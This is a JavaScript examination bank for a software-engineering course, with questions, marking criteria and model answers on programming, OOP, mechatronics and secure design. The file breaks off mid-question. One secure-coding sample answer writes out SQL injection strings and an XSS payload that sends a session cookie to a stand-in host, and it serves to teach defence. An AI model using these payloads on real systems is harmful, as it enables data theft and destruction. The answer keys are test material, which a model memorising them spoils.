/* ===========================================================================
   questions.js — multi-format examination bank
   Formats : mcq (auto-marked) | short | extended (criterion + keyword marked)
   Media   : code snippet | text log | system architecture diagram | scenario
   Each question maps to syllabus dot points and an outcome, so results feed
   straight into dot-point mastery and the diagnostic log.
   =========================================================================== */
(function (A) {
  'use strict';

  const Q = o => o;
  const code = (lang, src) => ({ kind: 'code', lang, src });
  const log = src => ({ kind: 'log', src });
  const dgm = key => ({ kind: 'diagram', key });
  const scen = text => ({ kind: 'scenario', text });

  const QUESTIONS = [

    /* ===================== PROGRAMMING FUNDAMENTALS ==================== */
    Q({
      id: 'PF-Q1', area: 'PF', points: ['PF-1.1'], outcome: 'SE-11-01', marks: 1, format: 'mcq',
      stem: 'A development team has just finished joining the newly written payment module to the existing shopping cart module so that they operate as one system. Which software development step is being carried out?',
      options: ['Determining specifications', 'Integration', 'Installation', 'Maintenance'],
      answer: 1,
      why: 'Integration is the step where separately developed modules and third-party components are joined so the system operates as a whole. Installation is deployment to the live environment; maintenance occurs after release.'
    }),
    Q({
      id: 'PF-Q2', area: 'PF', points: ['PF-4.7', 'PF-4.5'], outcome: 'SE-11-07', marks: 3, format: 'short',
      media: code('python', `def average_mark(marks):
    total = 0
    for i in range(1, len(marks)):
        total = total + marks[i]
    return total / len(marks)

print(average_mark([50, 60, 70, 80]))`),
      stem: 'The function above is intended to return the mean of a list of marks. It runs without crashing but returns 52.5 instead of 65. Identify the type of error, explain its cause, and describe how a debugging tool would locate it.',
      criteria: [
        { t: 'Identifies the error as a logic error', kw: ['logic'] },
        { t: 'Explains the cause — range(1, …) skips index 0, so the first mark is never added while the divisor still counts it', kw: ['range(1', 'index 0', 'first', 'skips', 'off by one', 'off-by-one'] },
        { t: 'Describes a debugging tool correctly (breakpoint, watch on total, single line stepping, or a debugging output statement)', kw: ['breakpoint', 'watch', 'step', 'single line', 'print', 'output statement', 'trace'] }
      ],
      sample: 'This is a logic error: the program runs to completion but produces the wrong output. The loop begins at index 1, so marks[0] (50) is never added to total, yet the division still uses len(marks) = 4, giving 210/4 = 52.5. Setting a breakpoint on the return statement and placing a watch on `total` while single line stepping through the loop would show total reaching 210 instead of 260, revealing that the first element was skipped. The fix is range(0, len(marks)) or simply iterating over marks directly.'
    }),
    Q({
      id: 'PF-Q3', area: 'PF', points: ['PF-3.2'], outcome: 'SE-11-04', marks: 2, format: 'short',
      stem: 'Represent −37 as an 8-bit two’s complement binary number. Show each step of your working.',
      criteria: [
        { t: 'Shows +37 = 0010 0101 and inverts the bits to 1101 1010', kw: ['00100101', '0010 0101', '11011010', '1101 1010'] },
        { t: 'Adds 1 to reach the correct answer 1101 1011', kw: ['11011011', '1101 1011'] }
      ],
      sample: '37 = 0010 0101. Invert every bit: 1101 1010. Add 1: 1101 1011. Therefore −37 = 1101 1011 in 8-bit two’s complement (the leading 1 confirms a negative value).'
    }),
    Q({
      id: 'PF-Q4', area: 'PF', points: ['PF-2.5', 'PF-2.1'], outcome: 'SE-11-02', marks: 4, format: 'short',
      media: code('text', `BEGIN Mystery(values)
    result = values[0]
    index = 1
    WHILE index < LENGTH(values)
        IF values[index] > result THEN
            result = values[index]
        END IF
        index = index + 1
    END WHILE
    RETURN result
END Mystery`),
      stem: 'Desk check the algorithm above using the data [4, 9, 2, 9, 7]. State the inputs, outputs and the purpose of the algorithm, and give the value of `result` after each iteration.',
      criteria: [
        { t: 'States the input (an array/list of values) and output (a single value)', kw: ['input', 'array', 'list', 'output'] },
        { t: 'Identifies the purpose — returns the largest/maximum value', kw: ['largest', 'maximum', 'max', 'highest', 'biggest'] },
        { t: 'Traces result correctly: 4 → 9 → 9 → 9 → 9', kw: ['9'] },
        { t: 'Uses a structured desk check (iteration/variable columns)', kw: ['iteration', 'desk check', 'trace', 'index'] }
      ],
      sample: 'Input: an array of numeric values. Output: one numeric value. Purpose: return the largest value in the array (a linear maximum search). Desk check — result starts at 4; index 1 (9): 9 > 4 so result = 9; index 2 (2): no change, result = 9; index 3 (9): 9 > 9 is false, result = 9; index 4 (7): no change, result = 9. Loop ends when index = 5. Output = 9.'
    }),
    Q({
      id: 'PF-Q5', area: 'PF', points: ['PF-4.2'], outcome: 'SE-11-02', marks: 1, format: 'mcq',
      stem: 'A program must repeatedly check whether a student ID already exists in a collection of 50 000 records, with lookup speed being the critical requirement. Which data structure is most appropriate?',
      options: ['A sequential file', 'A single-dimensional array searched linearly', 'A hash table', 'A stack'],
      answer: 2,
      why: 'A hash table converts the key directly to an index, giving average O(1) lookup regardless of size. A linear search is O(n), a sequential file must be read in order, and a stack only exposes the top element.'
    }),
    Q({
      id: 'PF-Q6', area: 'PF', points: ['PF-4.6'], outcome: 'SE-11-07', marks: 3, format: 'short',
      media: scen('A school enrolment form accepts a student’s age. Valid ages are 12 to 19 inclusive. Ages outside this range must be rejected with a message, and non-numeric input must not crash the program.'),
      stem: 'Determine a set of suitable test data for the age field. Your answer must include boundary values and faulty/abnormal data, and state the expected output for each.',
      criteria: [
        { t: 'Includes lower boundary tests (11, 12, 13)', kw: ['11', '12'] },
        { t: 'Includes upper boundary tests (18, 19, 20)', kw: ['19', '20'] },
        { t: 'Includes faulty/abnormal data (text, empty, negative, decimal, extreme)', kw: ['text', 'letter', 'abc', 'empty', 'blank', 'negative', 'decimal', '999', 'symbol'] },
        { t: 'States expected output for each case', kw: ['expected', 'accept', 'reject', 'error'] }
      ],
      sample: 'Boundary: 11 → rejected; 12 → accepted; 13 → accepted; 18 → accepted; 19 → accepted; 20 → rejected. Faulty/abnormal: "abc" → error message, no crash; empty string → "age is required"; −5 → rejected; 15.5 → rejected (must be a whole number); 999999 → rejected. Path coverage is achieved because each test drives a different branch: the accept branch, the out-of-range branch and the invalid-type branch.'
    }),
    Q({
      id: 'PF-Q7', area: 'PF', points: ['PF-4.3'], outcome: 'SE-11-01', marks: 4, format: 'extended',
      media: scen('A start-up is building a fitness tracking app. The founders know roughly what they want but expect user feedback to reshape the features every few weeks. A second team at the same company is building firmware for a medical infusion pump that must be certified against a fixed regulatory specification.'),
      stem: 'Compare the execution of the Waterfall and Agile project management models and recommend, with justification, a model for each of the two projects described.',
      criteria: [
        { t: 'Describes Waterfall as sequential with each stage completed and documented before the next', kw: ['sequential', 'stage', 'linear', 'falling water', 'sign off', 'completed before'] },
        { t: 'Describes Agile as iterative increments with continuous client involvement', kw: ['iterative', 'sprint', 'increment', 'continuous', 'feedback'] },
        { t: 'Recommends Agile for the fitness app and justifies it by changing requirements', kw: ['agile', 'fitness', 'changing', 'feedback'] },
        { t: 'Recommends Waterfall for the infusion pump and justifies it by fixed regulated requirements/documentation', kw: ['waterfall', 'pump', 'regulat', 'certif', 'documentation', 'safety'] }
      ],
      sample: 'Waterfall executes as a strict sequence — requirements, specifications, design, development, integration, testing, installation, maintenance — with each stage signed off and documented before the next begins, so change late in the project is expensive. Agile executes as repeated short iterations, each producing a working increment that the client reviews, so requirements are expected to evolve and the team re-plans every sprint. The fitness app should use Agile: its requirements will change with user feedback every few weeks, and Agile’s iteration workflow delivers usable software early and absorbs that change at low cost. The infusion pump should use Waterfall: its requirements are fixed by a regulatory specification that must be certified, and Waterfall’s complete documentation at each stage provides the traceability and auditability that certification demands, while the safety-critical nature makes late, unplanned change unacceptable.'
    }),

    /* ===================== OBJECT-ORIENTED PARADIGM ==================== */
    Q({
      id: 'OOP-Q1', area: 'OOP', points: ['OOP-1.1'], outcome: 'SE-11-02', marks: 1, format: 'mcq',
      media: code('python', `class Shape:
    def area(self):
        return 0

class Circle(Shape):
    def __init__(self, r):
        self.r = r
    def area(self):
        return 3.14159 * self.r ** 2

class Square(Shape):
    def __init__(self, s):
        self.s = s
    def area(self):
        return self.s ** 2

for shape in [Circle(2), Square(3)]:
    print(shape.area())`),
      stem: 'Which key feature of OOP is demonstrated by the final loop calling `shape.area()` and obtaining different behaviour for each object?',
      options: ['Encapsulation', 'Polymorphism', 'Abstraction', 'Generalisation'],
      answer: 1,
      why: 'Polymorphism — the same method call resolves to a different implementation depending on the actual class of the object (method overriding and dynamic dispatch). Inheritance makes it possible; polymorphism is what the loop demonstrates.'
    }),
    Q({
      id: 'OOP-Q2', area: 'OOP', points: ['OOP-1.1'], outcome: 'SE-11-02', marks: 4, format: 'short',
      media: code('python', `class BankAccount:
    def __init__(self, owner, balance):
        self.owner = owner
        self.balance = balance

acct = BankAccount("Nia", 500)
acct.balance = -99999`),
      stem: 'Explain how encapsulation would prevent the problem shown on the final line, and rewrite the class to apply it.',
      criteria: [
        { t: 'Defines encapsulation as bundling data with its methods and restricting direct access', kw: ['private', 'restrict', 'hide', 'bundl', 'direct access'] },
        { t: 'Explains the problem — external code can set an invalid state because the attribute is public', kw: ['public', 'invalid', 'directly', 'any code', 'integrity'] },
        { t: 'Rewrites with a private attribute (e.g. __balance)', kw: ['__balance', '_balance', 'private'] },
        { t: 'Provides methods (deposit/withdraw/getter) that validate before changing the value', kw: ['def deposit', 'def withdraw', 'getter', 'validat', 'if amount'] }
      ],
      sample: 'Encapsulation bundles an object’s data with the methods that operate on it and restricts direct external access, protecting data integrity. Here `balance` is public, so any code can write an impossible value with no validation. Rewritten:\n\nclass BankAccount:\n    def __init__(self, owner, balance=0):\n        self.__owner = owner\n        self.__balance = max(0, balance)\n    def get_balance(self):\n        return self.__balance\n    def deposit(self, amount):\n        if amount <= 0:\n            raise ValueError("Deposit must be positive")\n        self.__balance += amount\n    def withdraw(self, amount):\n        if amount > self.__balance:\n            raise ValueError("Insufficient funds")\n        self.__balance -= amount\n\nThe balance can now only change through methods that enforce the business rules.'
    }),
    Q({
      id: 'OOP-Q3', area: 'OOP', points: ['OOP-1.3'], outcome: 'SE-11-06', marks: 3, format: 'short',
      media: dgm('classdiagram'),
      stem: 'Interpret the class diagram above. Identify the relationship between the classes, explain what the − and + symbols indicate, and state one method that SavingsAccount inherits.',
      criteria: [
        { t: 'Identifies inheritance/generalisation (hollow triangle) with Account as the superclass', kw: ['inherit', 'generalis', 'superclass', 'parent', 'subclass'] },
        { t: 'Explains − as private (accessible only within the class) and + as public', kw: ['private', 'public'] },
        { t: 'States an inherited method — deposit(amt)', kw: ['deposit'] }
      ],
      sample: 'SavingsAccount and ChequeAccount inherit from Account — the hollow triangle pointing at Account shows generalisation, with Account as the superclass. The − prefix means the member is private and accessible only within its own class (accountNo, balance, interestRate, overdraft), while + means public and callable from outside (deposit, addInterest, withdraw). SavingsAccount inherits the public method deposit(amt), and accesses balance only through the inherited public interface.'
    }),
    Q({
      id: 'OOP-Q4', area: 'OOP', points: ['OOP-2.3'], outcome: 'SE-11-08', marks: 1, format: 'mcq',
      stem: 'A tester is given the specification for a function and a compiled executable, but no access to the source code. They design test cases from the specification alone. This is best described as:',
      options: ['White box unit testing', 'Black box testing', 'Grey box testing', 'Quality assurance'],
      answer: 1,
      why: 'Black box testing derives test cases only from the specification, with no knowledge of the internal code. White box uses the source to achieve path coverage; grey box is partial knowledge; quality assurance is the broader process of defining and checking standards.'
    }),
    Q({
      id: 'OOP-Q5', area: 'OOP', points: ['OOP-1.8', 'OOP-2.2'], outcome: 'SE-11-09', marks: 4, format: 'extended',
      media: log(`$ git log --oneline --graph
* 9f2c1aa (HEAD -> main) stuff
* 44ab02e fixed it
* 1c77e31 asdf
* b09de44 Merge branch 'main' of origin — CONFLICT resolved by taking ours
* 72ff105 final version FINAL v3 real
* 3a0c9e2 initial commit of everything`),
      stem: 'A Year 11 team submits the version control history above with their project. Evaluate this history against the features of OOP that support collaborative code development, and recommend three specific improvements.',
      criteria: [
        { t: 'Identifies poor commit messages that give no traceability of what changed or why', kw: ['commit message', 'message', 'meaningless', 'descriptive', 'traceab'] },
        { t: 'Identifies the absence of branching — all work on main, and a conflict resolved by discarding others’ work', kw: ['branch', 'main', 'conflict', 'ours', 'overwr', 'discard'] },
        { t: 'Links to a named collaboration feature (consistency, commenting, version control, feedback)', kw: ['consistency', 'comment', 'feedback', 'review', 'version control'] },
        { t: 'Gives three specific, actionable improvements', kw: ['should', 'recommend', 'use', 'branch', 'review', 'convention'] }
      ],
      sample: 'The history fails almost every collaborative requirement. Commit messages such as "stuff", "asdf" and "final version FINAL v3 real" provide no traceability: no team member or marker can tell what changed or why, which defeats the purpose of version control as a record of development. There is no branching — all commits land on main, so members cannot work in parallel safely, and the merge conflict was resolved by "taking ours", meaning another member’s work was silently discarded rather than reconciled. There is no evidence of feedback: no pull requests or review. Three improvements: (1) adopt a commit message convention that states the change and its reason (e.g. "Add input validation to enrolment form — rejects ages outside 12–19"); (2) use a feature branch per task with a pull request so a peer reviews and provides feedback before merging; (3) resolve conflicts by examining both versions together with the authors, and run the test suite before merging so nothing is lost. Consistent naming and code commenting should also be agreed as a team standard so any member can maintain any class.'
    }),
    Q({
      id: 'OOP-Q6', area: 'OOP', points: ['OOP-1.2'], outcome: 'SE-11-02', marks: 3, format: 'short',
      stem: 'Compare procedural programming with object-oriented programming, referring to how each organises data and how each supports maintenance of a large system.',
      criteria: [
        { t: 'Procedural: functions/procedures operating on data that is often global or passed around', kw: ['procedur', 'function', 'global', 'separate'] },
        { t: 'OOP: objects bundle data and behaviour, access controlled by the class', kw: ['object', 'class', 'encapsulat', 'bundle', 'attribute'] },
        { t: 'Addresses maintenance/scale — OOP localises change, supports reuse via inheritance; procedural becomes harder to maintain as size grows', kw: ['maintain', 'reuse', 'inherit', 'scale', 'large', 'localis'] }
      ],
      sample: 'Procedural programming structures a solution as a sequence of procedures and functions that act on data held separately, often globally, so any procedure can modify that data. OOP, by contrast, structures the solution as objects — instances of a class that bundle their own attributes with the methods that operate on them — where access is controlled through encapsulation rather than left open. The organising unit differs: procedural code is organised around the actions to be performed, whereas OOP is organised around the entities the system models. For maintenance of a large system, OOP localises change — modifying how a class stores its data affects only that class, provided the public interface is unchanged — and supports reuse through inheritance and polymorphism. Procedural code is efficient and simple for short, linear tasks, but as a system grows the shared data and sprawling call relationships make it increasingly difficult to change one part without unintended effects elsewhere.'
    }),

    /* ===================== MECHATRONICS ================================= */
    Q({
      id: 'MEC-Q1', area: 'MEC', points: ['MEC-2.2'], outcome: 'SE-11-03', marks: 1, format: 'mcq',
      media: dgm('controlloop'),
      stem: 'Referring to the diagram, which statement correctly distinguishes the closed loop system from the open loop system?',
      options: [
        'The closed loop system runs faster because it has fewer components',
        'The closed loop system measures its output and uses the error to adjust the actuator',
        'The open loop system uses a sensor to verify the output before acting',
        'The open loop system is always more accurate because there is no feedback delay'
      ],
      answer: 1,
      why: 'The defining feature of closed loop control is feedback: a sensor measures the actual output, the error (setpoint − measured) is calculated, and the controller adjusts the actuator to reduce that error. An open loop system never measures its output, so it cannot correct for disturbance.'
    }),
    Q({
      id: 'MEC-Q2', area: 'MEC', points: ['MEC-1.6', 'MEC-1.3'], outcome: 'SE-11-03', marks: 4, format: 'short',
      media: dgm('sorterarch'),
      stem: 'The parcel sorter in Figure E3 draws 180 mA (controller and sensors), 950 mA (conveyor motor) and 420 mA (diverter servo at peak). Calculate the expected runtime on the 2200 mAh battery, and identify the sensors, actuators and end effectors in the system.',
      criteria: [
        { t: 'Totals the current draw as 1550 mA', kw: ['1550', '1.55'] },
        { t: 'Calculates runtime ≈ 1.42 hours (about 85 minutes)', kw: ['1.4', '1.42', '85', '1 hour', '1.41'] },
        { t: 'Correctly classifies sensors: IR sensor, load cell, camera', kw: ['ir', 'load cell', 'camera'] },
        { t: 'Correctly classifies actuators (conveyor motor, servo) and the end effector (diverter arm)', kw: ['motor', 'servo', 'diverter', 'end effector'] }
      ],
      sample: 'Total peak draw = 180 + 950 + 420 = 1550 mA. Runtime = 2200 mAh ÷ 1550 mA ≈ 1.42 hours, or about 85 minutes — and less in practice once a safety margin of 20–30% is allowed for, so roughly one hour of dependable operation. Sensors: the IR sensor (parcel present, digital), the load cell (mass in grams, analogue via ADC) and the camera (label scan). Actuators: the conveyor motor (driven by PWM) and the diverter servo (0–180°). End effector/manipulator: the diverter arm, which is the component that physically acts on the parcel. The status display is the user interface, not a sensor or actuator.'
    }),
    Q({
      id: 'MEC-Q3', area: 'MEC', points: ['MEC-2.1', 'MEC-3.4'], outcome: 'SE-11-07', marks: 3, format: 'short',
      media: code('python', `SETPOINT = 25.0

def control(temp):
    if temp < SETPOINT:
        return 100      # heater full power
    else:
        return 0        # heater off`),
      stem: 'A greenhouse heater uses the control algorithm above. Testing shows the heater switching on and off several times per second around the setpoint. Explain the cause of this behaviour and modify the algorithm to resolve it.',
      criteria: [
        { t: 'Identifies oscillation/chattering caused by the absence of a dead band or hysteresis — tiny sensor fluctuations cross the threshold', kw: ['oscillat', 'chatter', 'dead band', 'deadband', 'hysteresis', 'threshold', 'fluctuat', 'noise'] },
        { t: 'Notes the consequence (actuator wear, power waste, instability)', kw: ['wear', 'damage', 'power', 'energy', 'unstable', 'lifespan'] },
        { t: 'Modifies the algorithm with a tolerance band or proportional control', kw: ['tolerance', 'band', 'proportional', 'abs(', 'hysteresis', '- 0.5', '+ 0.5'] }
      ],
      sample: 'The algorithm is a bang-bang controller with a single threshold and no dead band. Because real sensor readings fluctuate by small amounts around 25.0 °C, the condition flips between true and false many times per second, so the heater chatters. This wastes energy, causes relay and heater wear, and never settles. Adding hysteresis fixes it:\n\nON_BELOW, OFF_ABOVE = 24.5, 25.5\nstate = False\ndef control(temp):\n    global state\n    if temp < ON_BELOW: state = True\n    elif temp > OFF_ABOVE: state = False\n    return 100 if state else 0\n\nA proportional controller (power = Kp × error, clamped to 0–100) is a further improvement because it reduces power smoothly as the setpoint is approached rather than switching between extremes.'
    }),
    Q({
      id: 'MEC-Q4', area: 'MEC', points: ['MEC-1.8'], outcome: 'SE-11-05', marks: 4, format: 'extended',
      media: scen('A team is designing a robotic kitchen assistant that fetches and opens containers for a person with limited hand strength and reduced fine motor control.'),
      stem: 'Determine the specialist requirements that would influence the design and functions of this mechatronic system, and explain the social implications of getting them wrong.',
      criteria: [
        { t: 'Identifies accessible input/output modes (voice, switch, large targets, audio/haptic feedback)', kw: ['voice', 'switch', 'large', 'audio', 'haptic', 'alternative input', 'speech'] },
        { t: 'Identifies safety requirements (force limits, emergency stop, predictable and reversible motion)', kw: ['force', 'emergency stop', 'e-stop', 'safety', 'slow', 'predictab', 'interlock'] },
        { t: 'Identifies consultation with actual users / co-design', kw: ['consult', 'co-design', 'user', 'lived experience', 'involve', 'test with'] },
        { t: 'Explains a social implication (independence, dignity, exclusion, reliance on an unreliable device)', kw: ['independen', 'dignity', 'exclu', 'reliance', 'participat', 'equity'] }
      ],
      sample: 'Specialist requirements: input must not depend on grip or fine motor precision, so voice commands, large physical buttons or a single-switch interface with scanning are required, with confirmation given as both audio and visual feedback. Actuator force must be limited and compliant so that a collision with the user cannot cause injury, with an emergency stop reachable from the user’s seated position and all motions slow, predictable and reversible. Gripper force must adapt to the container (enough to open a jar, gentle on a glass). The system must be reliable and easily repaired, because the user may depend on it daily, and must consume little enough power to run through a meal. Critically, these requirements must come from consultation and co-design with people who have the condition, not from assumption. Socially, a well-designed system increases independence, privacy and dignity by removing the need to ask for help with everyday tasks, and can increase participation in work and family life. If the requirements are misjudged — a voice interface that cannot understand atypical speech, or a device that fails intermittently — the user is excluded from the benefit while still bearing the cost, their autonomy is reduced rather than increased, and trust in assistive technology generally is damaged.'
    }),
    Q({
      id: 'MEC-Q5', area: 'MEC', points: ['MEC-1.2'], outcome: 'SE-11-03', marks: 2, format: 'short',
      stem: 'Explain how the hardware of a microcontroller influences the way code is written for a mechatronic system. Refer to two specific hardware characteristics.',
      criteria: [
        { t: 'Names a specific constraint (limited RAM/flash, no FPU, clock speed, instruction set, register width)', kw: ['ram', 'memory', 'flash', 'floating point', 'fpu', 'clock', 'instruction set', 'register', '8-bit', '16-bit'] },
        { t: 'Explains the consequence for the code written', kw: ['integer', 'avoid', 'efficient', 'smaller', 'fixed point', 'loop', 'sampling', 'optimis'] }
      ],
      sample: 'A microcontroller typically has a few kilobytes of RAM, so code must avoid large arrays and dynamic allocation, instead processing sensor data in a rolling buffer. Many microcontrollers have no floating-point unit, so floating-point arithmetic is emulated in software and is far slower than integer maths; control code therefore often uses fixed-point integer arithmetic to keep the control loop within its timing budget. The instruction set and clock speed together set how many operations can run per control cycle, which limits how complex the algorithm inside a 50 Hz loop can be.'
    }),

    /* ===================== SECURE SOFTWARE ARCHITECTURE ================ */
    Q({
      id: 'SSA-Q1', area: 'SSA', points: ['SSA-2.1'], outcome: 'SE-12-04', marks: 1, format: 'mcq',
      stem: 'A hospital system records which staff member viewed each patient record, with a timestamp that cannot be altered. Which fundamental software design security concept is being implemented?',
      options: ['Confidentiality', 'Availability', 'Accountability', 'Authorisation'],
      answer: 2,
      why: 'Accountability means actions can be traced to an identity, which is achieved through tamper-evident audit logs. Confidentiality would be restricting who can read the record; authorisation would be deciding who is permitted to view it.'
    }),
    Q({
      id: 'SSA-Q2', area: 'SSA', points: ['SSA-2.7', 'SSA-2.10'], outcome: 'SE-12-07', marks: 5, format: 'extended',
      media: code('javascript', `app.get('/search', (req, res) => {
  const term = req.query.q;
  const sql  = "SELECT * FROM notes WHERE title LIKE '%" + term + "%'";
  db.query(sql, (err, rows) => {
    res.send("<h2>Results for " + term + "</h2>" + render(rows));
  });
});`),
      stem: 'Identify two distinct vulnerabilities in the code above, explain how each could be exploited, and rewrite the handler using defensive data input handling practices.',
      criteria: [
        { t: 'Identifies SQL injection from string concatenation into the query', kw: ['sql injection', 'injection', 'concat'] },
        { t: 'Identifies reflected XSS from echoing `term` into the HTML response', kw: ['xss', 'cross-site scripting', 'script', 'reflect'] },
        { t: 'Explains an exploit for each (e.g. \' OR 1=1 --, and <script>…</script> stealing a session cookie)', kw: ['or 1=1', "' or", 'drop table', '<script', 'cookie', 'steal'] },
        { t: 'Applies parameterised queries / prepared statements', kw: ['parameteris', 'parameteriz', 'prepared', 'placeholder', '?'] },
        { t: 'Applies output encoding/escaping and input validation or sanitisation', kw: ['escape', 'encod', 'sanitis', 'sanitiz', 'validat', 'textcontent'] }
      ],
      sample: 'Vulnerability 1 — SQL injection: the search term is concatenated directly into the SQL string, so the database cannot distinguish code from data. A request of ?q=%\' OR 1=1 -- returns every note in the table regardless of ownership, and a stacked statement such as \'; DROP TABLE notes; -- could destroy data. Vulnerability 2 — reflected cross-site scripting: the term is echoed into the HTML response without encoding, so a crafted link containing ?q=<script>fetch(\'https://evil.site?c=\'+document.cookie)</script> executes in the victim’s browser and exfiltrates their session cookie, leading to session hijacking.\n\nRewritten defensively:\n\napp.get(\'/search\', (req, res) => {\n  const term = String(req.query.q ?? \'\').trim();\n  if (term.length === 0 || term.length > 50) {\n    return res.status(400).render(\'error\', { message: \'Search term must be 1–50 characters\' });\n  }\n  db.query(\'SELECT id, title FROM notes WHERE owner_id = ? AND title LIKE ?\',\n    [req.session.userId, `%${term}%`],\n    (err, rows) => {\n      if (err) { logger.error(err); return res.status(500).render(\'error\', { message: \'Search unavailable\' }); }\n      res.render(\'results\', { term, rows });   // template engine escapes output\n    });\n});\n\nThis parameterises the query so user input can never be parsed as SQL, validates length and type before use, escapes output through the template engine to neutralise scripts, restricts results to the authenticated owner, and handles errors by logging the detail server-side while returning a generic message that leaks nothing about the database.'
    }),
    Q({
      id: 'SSA-Q3', area: 'SSA', points: ['SSA-2.1', 'SSA-2.5', 'SSA-2.10'], outcome: 'SE-12-04', marks: 6, format: 'extended',
      media: dgm('loginarch'),
      stem: 'Figure E1 shows the deployed authentication architecture for an application called SecureNotes. Analyse the architecture and evaluate its security, identifying at least four weaknesses and recommending a remediation for each.',
      criteria: [
        { t: 'Identifies HTTP (port 80) rather than HTTPS — credentials in plain text, open to interception', kw: ['http', 'https', 'plain text', 'tls', 'intercept', 'encrypt'] },
        { t: 'Identifies MD5 password storage — broken hash, no salt, rainbow tables', kw: ['md5', 'hash', 'salt', 'bcrypt', 'argon'] },
        { t: 'Identifies predictable session IDs (userID+1) enabling session hijacking', kw: ['session', 'predictab', 'guess', 'hijack', 'random'] },
        { t: 'Identifies passwords written to logs', kw: ['log', 'password in log', 'logging'] },
        { t: 'Identifies the admin panel with no authorisation check', kw: ['admin', 'authoris', 'authoriz', 'access control', 'privilege'] },
        { t: 'Recommends specific, correct remediations', kw: ['recommend', 'should', 'replace', 'implement', 'enforce'] }
      ],
      sample: 'Weakness 1 — the API gateway accepts HTTP on port 80, so usernames and passwords cross the network as plain text and can be captured by anyone on the path, defeating confidentiality. Remediation: enforce HTTPS/TLS everywhere with HSTS and redirect port 80, using a CA-issued certificate. Weakness 2 — the user database stores passwords hashed with MD5, which is cryptographically broken and, being fast and unsalted, falls to rainbow tables and GPU cracking within minutes. Remediation: re-hash with a slow, salted algorithm such as bcrypt or Argon2id and force a password reset. Weakness 3 — session identifiers are generated as userID+1, so any authenticated user can guess another user’s session and impersonate them (broken session management). Remediation: generate cryptographically random session IDs of at least 128 bits, regenerate the ID on login, set HttpOnly, Secure and SameSite flags and expire sessions on timeout and logout. Weakness 4 — the log service records full passwords, so every administrator and anyone who obtains a log backup gains credentials, and the logs become a higher-value target than the database. Remediation: never log credentials; redact sensitive fields and restrict and monitor log access. Weakness 5 — the admin panel performs no authorisation check, so authentication alone grants administrative capability; a normal user who finds the URL has full control (broken access control). Remediation: enforce role-based authorisation server-side on every admin endpoint, applying least privilege, and log all administrative actions for accountability. Overall the architecture fails confidentiality, integrity and accountability, and the defects are compounding: the plain-text transport and predictable sessions each independently allow account takeover, so the system should not be considered fit for storing private notes until all five are remediated and verified by penetration testing.'
    }),
    Q({
      id: 'SSA-Q4', area: 'SSA', points: ['SSA-2.5', 'SSA-2.6'], outcome: 'SE-12-08', marks: 4, format: 'short',
      media: log(`2026-03-14 02:14:07 INFO  auth  login success user=admin ip=203.0.113.9
2026-03-14 02:14:09 WARN  auth  login failed  user=admin ip=198.51.100.4
2026-03-14 02:14:09 WARN  auth  login failed  user=admin ip=198.51.100.4
2026-03-14 02:14:10 WARN  auth  login failed  user=admin ip=198.51.100.4
2026-03-14 02:14:10 WARN  auth  login failed  user=admin ip=198.51.100.4
   ... 41 283 similar entries omitted ...
2026-03-14 02:51:55 WARN  auth  login failed  user=admin ip=198.51.100.4
2026-03-14 02:51:56 INFO  auth  login success user=admin ip=198.51.100.4
2026-03-14 02:52:31 INFO  data  export table=users rows=48217 ip=198.51.100.4
2026-03-14 02:52:44 INFO  admin user_delete target=audit_bot ip=198.51.100.4`),
      stem: 'Analyse the server log above. Describe the attack that has occurred, and recommend two controls that would have prevented or limited it.',
      criteria: [
        { t: 'Identifies a brute-force / credential-guessing attack on the admin account', kw: ['brute force', 'brute-force', 'guess', 'credential stuffing', 'dictionary'] },
        { t: 'Notes that the attack succeeded and was followed by mass data exfiltration', kw: ['success', 'export', 'exfiltrat', '48217', 'data breach', 'stolen'] },
        { t: 'Notes the deletion of audit_bot as an attempt to destroy accountability evidence', kw: ['audit', 'delete', 'cover', 'evidence', 'accountab'] },
        { t: 'Recommends two specific controls (rate limiting/lockout, MFA, IP blocking, alerting, least privilege, export limits)', kw: ['rate limit', 'lockout', 'mfa', 'multi-factor', '2fa', 'captcha', 'block', 'alert', 'least privilege'] }
      ],
      sample: 'The log shows an online brute-force attack: from 02:14 to 02:51 a single source, 198.51.100.4, made over 41 000 failed login attempts against the `admin` account at roughly 20 per second, and at 02:51:56 one attempt succeeded. Thirty-five seconds later that session exported the entire users table (48 217 rows) — a mass data exfiltration — and then deleted the account `audit_bot`, which is an attempt to destroy the logging that would evidence the intrusion, attacking accountability as well as confidentiality. Controls: (1) rate limiting with progressive account lockout and CAPTCHA after a small number of failures, which makes 41 000 attempts take years rather than 37 minutes, combined with automatic blocking of the offending IP; (2) mandatory multi-factor authentication on administrative accounts, so a guessed password alone is insufficient. In addition, real-time alerting on anomalous failure rates and on bulk data export, plus append-only logs shipped to a separate system, would have detected and contained the incident instead of allowing it to run undetected for 38 minutes.'
    }),
    Q({
      id: 'SSA-Q5', area: 'SSA', points: ['SSA-2.4'], outcome: 'SE-12-04', marks: 3, format: 'short',
      media: scen('A fitness app collects continuous GPS location, contacts, and health metrics. The default settings share the user’s route publicly, and the privacy policy is a 12-page document shown once at sign-up. Data is retained indefinitely "to improve the service".'),
      stem: 'Evaluate this app against the ‘privacy by design’ approach, referring to all three aspects named in the syllabus.',
      criteria: [
        { t: 'Proactive not reactive — privacy risk anticipated and prevented before harm, not patched after a complaint', kw: ['proactive', 'reactive', 'anticipat', 'prevent', 'before'] },
        { t: 'Embed privacy into design — privacy as a default/core component, data minimisation', kw: ['default', 'embed', 'minimis', 'minimiz', 'core', 'by default'] },
        { t: 'Respect for user privacy — consent, control, transparency', kw: ['consent', 'control', 'transparen', 'respect', 'user-centric', 'retention'] }
      ],
      sample: 'The app fails all three aspects. Proactive not reactive: publicly sharing routes by default creates a foreseeable stalking and home-address disclosure risk, which the design should have anticipated and prevented rather than waiting for an incident. Embed privacy into design: privacy is an afterthought rather than a core component — the most private setting should be the default, and the app should practise data minimisation by not collecting contacts at all unless a feature genuinely needs them, and by collecting coarse location where precise GPS is unnecessary. Respect for user privacy: a 12-page policy shown once is not meaningful, informed consent; users need granular, revocable controls presented in context, clear plain-language explanation of each collection purpose, and a defined retention period with deletion on request rather than indefinite retention justified by a vague purpose.'
    }),
    Q({
      id: 'SSA-Q6', area: 'SSA', points: ['SSA-2.6'], outcome: 'SE-12-06', marks: 1, format: 'mcq',
      stem: 'A security team runs an automated tool that analyses the application’s source code before it is compiled, flagging unsanitised input paths. Which strategy is this?',
      options: ['Dynamic application security testing (DAST)', 'Penetration testing', 'Static application security testing (SAST)', 'Vulnerability assessment'],
      answer: 2,
